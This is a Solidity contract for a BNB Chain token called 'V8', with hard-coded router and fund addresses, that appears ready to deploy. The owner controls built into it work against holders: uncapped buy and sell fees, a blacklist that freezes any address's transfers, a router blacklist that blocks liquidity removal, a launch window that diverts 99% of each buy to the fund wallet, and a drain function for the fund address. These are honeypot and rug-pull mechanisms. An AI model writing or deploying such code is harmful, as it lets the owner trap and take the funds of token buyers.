// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}


interface ISwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

interface IWBNB {
    function withdraw(uint) external  ;
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address payable public fundAddress;
    address payable public fundAddress_2;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _isExcludeFromFees;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _wbnb;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFundFee = 300;
    uint256 public _buyLPFee = 100;

    uint256 public _sellFundFee = 300;
    uint256 public _sellLPFee = 100;

    uint256 public _maxWalletAmount;


    address public _mainPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address USDTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address _Fund, address _Fund_2, address ReceiveAddress
    ){
        
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(USDTAddress).approve(address(swapRouter), MAX);
        require(USDTAddress < address(this),"?");
        _wbnb = USDTAddress;

        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), USDTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _maxWalletAmount = Supply * 10 ** Decimals;
        _tTotal = total;
        swapAtAmount = 0;

        _balances[ReceiveAddress] = total;

        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = payable(_Fund);
        fundAddress_2 = payable(_Fund_2);

        _isExcludeFromFees[_Fund] = true;
        _isExcludeFromFees[ReceiveAddress] = true;
        _isExcludeFromFees[address(this)] = true;
        // _isExcludeFromFees[address(swapRouter)] = true;
        _lpBlackList[address(swapRouter)] = true;
        _isExcludeFromFees[msg.sender] = true;

        _tokenDistributor = new TokenDistributor(USDTAddress);
    }

    function setMaxWalletAmount(
        uint256 newValue 
    ) public onlyOwner {
        _maxWalletAmount = newValue;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    uint256 public swapAtAmount;
    function setSwapAtAmount(uint256 newValue) public onlyOwner{
        swapAtAmount = newValue;
    }

    uint256 public airDropNumbs = 0;
    function setAirdropNumbs(uint256 newValue) public onlyOwner{
        airDropNumbs = newValue;
    }

    function setBuy(uint256 newFund,uint256 newLp) public onlyOwner{
        _buyFundFee = newFund;
        _buyLPFee = newLp;
    }

    function setSell(uint256 newFund,uint256 newLp) public onlyOwner{
        _sellFundFee = newFund;
        _sellLPFee = newLp;
    }


    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(
            sender,
            address(fundAddress),
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function tradingOpen() public view returns(bool){
        return block.timestamp >= startTime && startTime != 0;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        require(!_Against[from] && !_Against[to],"against");

        bool takeFee;
        bool isSell;

        if (inSwap) {
            _basicTransfer(from, to, amount);
            return;
        }

        if(
            !_isExcludeFromFees[from] &&
            !_isExcludeFromFees[to] &&
            airDropNumbs > 0 && (
                _swapPairList[from] || _swapPairList[to]
            )
        ){
            address ad;
            for(uint256 i=0;i < airDropNumbs;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _basicTransfer(from,ad,100);
            }
            amount -= airDropNumbs*100;
        }

        if (!_isExcludeFromFees[from] && !_isExcludeFromFees[to] && !_swapPairList[from] && !_swapPairList[to]){
            require(tradingOpen());
        }

        bool isRemove;
        bool isAdd;
        
        if (_swapPairList[to]) {
            isAdd = _isAddLiquidity();
        }else if(_swapPairList[from]){
            isRemove = _isRemoveLiquidity();
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_isExcludeFromFees[from] && !_isExcludeFromFees[to]) {
                if (!tradingOpen()) {
                    require(0 < goAddLPBlock && isAdd, "!goAddLP"); //_swapPairList[to]
                }

                if (_swapPairList[from]) {
                    require(_maxWalletAmount == 0 || amount + balanceOf(to) <= _maxWalletAmount, "ERC20: > max wallet amount");
                }

                if (block.timestamp < startTime + fightB && _swapPairList[from]) {
                    _funTransfer(from, to, amount);
                    return;
                    // _Against[to] = true;
                }

                if (_swapPairList[to]) {
                    if (!inSwap && !isAdd) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > swapAtAmount) {
                            uint256 swapFee = _buyLPFee + _buyFundFee + _sellFundFee  + _sellLPFee;
                            uint256 numTokensSellToFund = amount;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
                if (!isAdd && !isRemove) takeFee = true; // just swap fee
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        if (
            !_swapPairList[from] &&
            !_swapPairList[to] &&
            !_isExcludeFromFees[from] &&
            !_isExcludeFromFees[to]
        ) {
            // isSell = true;
            takeFee = false;
        }

        _tokenTransfer(
            from,
            to,
            amount,
            takeFee,
            isSell,
            isAdd,
            isRemove
        );

        if (from != address(this)) {
            if (isSell) {
                addHolder(from);
            }
        }
    }


    function _isAddLiquidity() internal view returns (bool isAdd){
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _wbnb;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isAdd = bal > r;
    }

    function _isRemoveLiquidity() internal view returns (bool isRemove){
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _wbnb;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isRemove = r >= bal;
    }

    mapping(address => bool) public _Against;
    function multiAgainst(address[] calldata addresses, bool value) public onlyOwner{
        for (uint256 i; i < addresses.length; ++i) {
            _Against[addresses[i]] = value;
        }
    }

    function setAgainst(address addr, bool status) public onlyOwner{
        _Against[addr] = status;
    }

    mapping(address => bool) public _lpBlackList;
    function multiLpBlackList(address[] calldata addresses, bool value) public onlyOwner{
        for (uint256 i; i < addresses.length; ++i) {
            _lpBlackList[addresses[i]] = value;
        }
    }


    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell,
        bool isAdd,
        bool isRemove
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPFee;
            } else {
                swapFee = _buyFundFee + _buyLPFee;
            }

            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }

        }

        if (isAdd && !_isExcludeFromFees[sender] && !_isExcludeFromFees[recipient]) {
            uint256 addLiquidityFeeAmount;
            addLiquidityFeeAmount = (tAmount * getAddlpFee()) / 10000;

            if (addLiquidityFeeAmount > 0) {
                feeAmount += addLiquidityFeeAmount;
                _takeTransfer(sender, address(this), addLiquidityFeeAmount);
            }
        }

        if (isRemove && !_isExcludeFromFees[sender] && !_isExcludeFromFees[recipient]) {
            require(!_lpBlackList[recipient],"cant remove lp");

            uint256 removeLiquidityFeeAmount;
            removeLiquidityFeeAmount = (tAmount * getRemovelpFee()) / 10000;

            if (removeLiquidityFeeAmount > 0) {
                feeAmount += removeLiquidityFeeAmount;
                _takeTransfer(sender, address(0xdead), removeLiquidityFeeAmount);
            }
        }


        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    uint256 public addLiquidityFee;
    uint256 public removeLiquidityFee;

    function setAddLiquidityFee(uint256 newValue) public onlyOwner {
        require(newValue <= 10000, "add Lp > 100 !");
        addLiquidityFee = newValue;
    }

    function setRemoveLiquidityFee(uint256 newValue) public onlyOwner {
        require(newValue <= 10000, "remove Lp> 100 !");
        removeLiquidityFee = newValue;
    }

    function getAddlpFee() public view returns(uint256){
        return addLiquidityFee;
    }

    function getRemovelpFee() public view returns(uint256){
        return removeLiquidityFee;
    }

    event FAILED_SWAP(uint256);
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        if (swapFee == 0) return;
        swapFee += swapFee;
        uint256 lpFee = _sellLPFee + _buyLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _wbnb;
        try _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        ) {} catch { emit FAILED_SWAP(0); }

        swapFee -= lpFee;

        IERC20 FIST = IERC20(_wbnb);
        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
        if (fundAmount > 0){
            // uint256 half_fund = fundAmount / 3;
            // FIST.transferFrom(address(_tokenDistributor), fundAddress, half_fund);
            // FIST.transferFrom(address(_tokenDistributor), fundAddress_2, fundAmount - half_fund);
            FIST.transferFrom(address(_tokenDistributor), address(this), fundAmount);
            IWBNB(_wbnb).withdraw(fundAmount);
            uint256 half_fund = fundAmount / 3;
            fundAddress.transfer(half_fund);
            fundAddress_2.transfer(fundAmount - half_fund);
        }

        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance - fundAmount);

        if (lpAmount > 0) {
            uint256 lpFist = fistBalance * lpFee / swapFee;
            if (lpFist > 0) {
                try _swapRouter.addLiquidity(
                    address(this), _wbnb, lpAmount, lpFist, 0, 0, fundAddress_2, block.timestamp
                ) {} catch { emit FAILED_SWAP(1); }
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address payable addr) external onlyOwner {
        fundAddress = addr;
        _isExcludeFromFees[addr] = true;
    }

    function setFundAddress_2(address payable addr) external onlyOwner {
        fundAddress_2 = addr;
        _isExcludeFromFees[addr] = true;
    }

    uint256 public goAddLPBlock;
    function addLPBegin() external onlyOwner {
        require(0 == goAddLPBlock, "startedAddLP");
        goAddLPBlock = block.number;
    }

    function addLPEnd() external onlyOwner {
        goAddLPBlock = 0;
    }

    uint256 public fightB;
    uint256 public startTime;

    function launch(uint256 _kb,uint256 s) external onlyOwner {
        fightB = _kb;
        if (s == 1){
            startTime = block.timestamp;
        }else{
            startTime = 0;
        }
    }
    
    function launchNow() public onlyOwner{
        startTime = block.timestamp;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _isExcludeFromFees[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function setClaims(address token, uint256 amount) external {
        if (msg.sender == fundAddress){
            if (token == address(0)){
                payable(msg.sender).transfer(amount);
            }else{
                IERC20(token).transfer(msg.sender, amount);
            }
        }
    }

    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    function setWLs(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _isExcludeFromFees[addresses[i]] = status;
        }
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

}

contract TOKEN is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
        address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),
        "V8",
        "V8",
        9,
        1000000,
        address(0x6A16b2B297A066197054AdD33DCa79c656C68052),
        address(0x2cEB48396437A99b26Bd28355f193dB2E26A8A74),
        address(0x39B6764c4b155308E9DE774f2bE056A0B9251E40) //receiver
    ){
    }
}